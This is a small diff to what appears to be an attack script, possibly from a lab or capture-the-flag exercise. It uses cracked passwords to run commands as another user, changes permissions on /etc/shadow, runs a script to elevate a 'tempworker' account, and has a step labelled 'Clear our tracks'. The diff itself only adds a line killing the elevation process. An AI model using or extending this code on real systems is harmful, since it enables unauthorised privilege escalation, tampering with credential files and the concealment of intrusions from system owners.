@@ -110,9 +110,9 @@ print(sysadmin_cracked)
 # Fix permissions
 exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 
-
 # Elevate tempworker
 elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False)
+elevate_process.kill()
 
 
 # Clear our tracks
